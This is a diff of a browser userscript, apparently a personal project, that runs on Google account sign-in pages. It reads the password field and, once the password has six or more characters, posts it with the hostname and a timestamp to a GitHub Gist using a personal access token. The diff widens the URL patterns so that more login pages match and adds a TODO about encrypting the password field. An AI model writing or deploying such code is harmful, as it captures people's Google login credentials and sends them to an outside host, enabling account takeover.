@@ -4,8 +4,8 @@
 // @namespace   https://gist.github.com/micalevisk/3f94e2000732ce51304472a4564f4cfe
 // @author      Micael Levi
 // @locale      pt-br
-// @include     *://accounts.google.com/ServiceLogin?*
-// @include     *://accounts.google.com/signin*
+// @include     *://accounts.google.com/*ServiceLogin?*
+// @include     *://accounts.google.com/*signin*
 // @version     1.04-2
 // @grant       none
 // ==/UserScript==
@@ -20,7 +20,7 @@
 // GIST_USERNAME = AUTH.username;
 // PERSONAL_ACCESS_TOKEN = AUTH.useroauth;
 const GIST_USERNAME = "micalevisk";
-const PERSONAL_ACCESS_TOKEN = "<OAUTH>";
+const PERSONAL_ACCESS_TOKEN = "<OAuth>";
 ////////////////////////////////////////////////
 
 
@@ -91,7 +91,7 @@ function initgistachioAPI(id, confirmar){
 function postit(conteudo, filename, filedescription, oauthgist){
         if(!conteudo || !filename) return;
 
-        conteudo = getDateAndHour() + '\n' + window.location.hostname + '\n' + conteudo.toString();
+        conteudo = `${getDateAndHour()}\n<${window.location.hostname}>\n${conteudo.toString()}`;
 
         console.info("PREVIEW:");
         console.log(conteudo);
@@ -148,6 +148,7 @@ function GM_main(){
                                 user_especs.senha = password.value;
 
                                 if((!user_especs.flag) && (user_especs.senha.length >= 6))
+                                //TODO passar o objeto com um método para criptografar somente o campo 'senha'
                                 postit(user_especs,
                                         'teste bitch please conteúdo',
                                         'descrição do gist',
